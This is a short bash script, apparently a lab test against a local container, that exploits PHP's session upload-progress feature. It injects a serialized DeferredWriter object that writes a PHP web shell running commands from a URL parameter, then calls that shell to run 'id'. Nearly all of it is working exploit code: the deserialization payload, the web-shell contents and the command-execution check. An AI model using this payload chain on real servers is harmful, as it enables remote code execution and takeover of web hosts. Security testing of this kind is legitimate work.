#!/bin/bash
# Manual session-gap stage test on van85: does the rfc1867 hook persist the
# poisoned upload_progress key under the PHPSESSID we supply?
SID=p2s000000000000000000000000000
INJ='inj|O:14:"DeferredWriter":2:{s:4:"path";s:26:"/var/www/html/p2s_shell.php";s:4:"data";s:29:"<?php @system($_GET["c"]); ?>";}'
rm -f /tmp/sg_test.html
curl -sv -o /tmp/sg_test.html \
  -b "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=$INJ" \
  -F "f=@/etc/hostname;filename=notes.txt" \
  http://127.0.0.1:8085/up.php 2>/tmp/sg_curl.log
grep -E "^< HTTP|^> Cookie|Content-Type" /tmp/sg_curl.log | head -5
cat /tmp/sg_test.html; echo
echo "--- session files:"
docker exec van85 sh -c 'ls -la /tmp/sess_* 2>/dev/null; echo "== p2s file:"; cat /tmp/sess_p2s* 2>/dev/null | head -c 500; echo'
echo "--- read side:"
curl -s -b "PHPSESSID=$SID" http://127.0.0.1:8085/read.php
echo "--- shell check:"
curl -s "http://127.0.0.1:8085/p2s_shell.php?c=id"
